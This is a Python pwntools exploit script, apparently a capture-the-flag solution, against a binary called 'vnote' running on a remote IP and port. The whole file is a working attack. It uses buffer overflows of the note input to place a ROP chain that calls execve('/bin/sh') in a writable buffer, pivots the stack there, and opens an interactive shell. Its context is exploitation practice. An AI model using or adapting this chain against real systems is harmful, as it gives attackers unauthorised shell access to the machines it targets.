#!/usr/bin/python
from pwn import *

CONN = "nc 103.181.183.216 17002".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# ===========================================================
#                    WRAPPER FUNCTION
# ===========================================================

def sl(x): io.sendline(x)
def sla(x, y): io.sendlineafter(x, y)
def se(x): io.send(x)
def sa(x, y): io.sendafter(x, y)
def ru(x, drop=False): return io.recvuntil(x, drop=drop)
def rl(): return io.recvline()
def cl(): io.clean()
def un64(x): return u64(x.ljust(8, b'\x00'))
def leak(name, addr): info(f"{name} @ {hex(addr)}")

# ===========================================================
#                           SETUP
# ===========================================================

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = """
b *main+167
b *0x4019ed
b *0x4019c3
c
""".format(
    **locals()
)

# Binary filename
exe = "./vnote"

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)

# Change logging level to help with debugging (error/warning/info/debug)
# context.terminal = "tmux splitw -h".split(" ")ls
context.log_level = "debug"

# Lib-C library, can use pwninit/patchelf to patch binary
libc = elf.libc
# ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

if args.REMOTE:
    pass
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    # ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

payload = b"A"*32 + b"\x98"
sla(b"note: ", payload)

syscall = 0x0000000000401a8f
poprdiret = 0x0000000000401d87
poprsiret = 0x000000000040a67e
popraxret = 0x0000000000450747
gadget1 = 0x000000000048656a # pop rax ; pop rdx ; pop rbx ; ret
private_buffer = 0x00000000004c9320
leaveret = 0x0000000000401833
poprbpret = 0x00000000004017a1


payload = flat({
  0: [
    b"/bin/sh\x00",
    p64(poprdiret),
    p64(private_buffer),
    p64(poprsiret),
    p64(0),
    p64(gadget1),
    constants.SYS_execve,
    p64(0),
    p64(0),
    p64(syscall),
  ]
})
sla(b"note: ", payload)

offset = 72
payload = flat({
  offset: [
    p64(poprbpret),
    p64(private_buffer),
    p64(leaveret),
    p64(private_buffer+8)
  ]
})
sla(b"note: ", payload)

io.interactive()